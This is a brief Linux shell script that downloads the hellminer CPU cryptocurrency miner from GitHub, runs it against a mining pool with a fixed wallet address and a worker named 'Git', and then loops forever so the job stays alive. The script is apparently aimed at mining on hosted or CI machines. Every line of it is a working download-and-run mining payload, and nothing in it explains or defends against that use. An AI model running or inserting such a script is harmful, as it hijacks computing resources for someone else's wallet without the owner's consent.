#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://sg.minexmr.com:4444#xnsub -u 85g3ACGwaFrVKsxcUzLfKN2ythUVi3Grk76FT5YKKkAfbBceEohBseBAQahE83VnqjVjkiWzJiw1gZjH6fxxEuz91fUUsQX.Git -p x --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
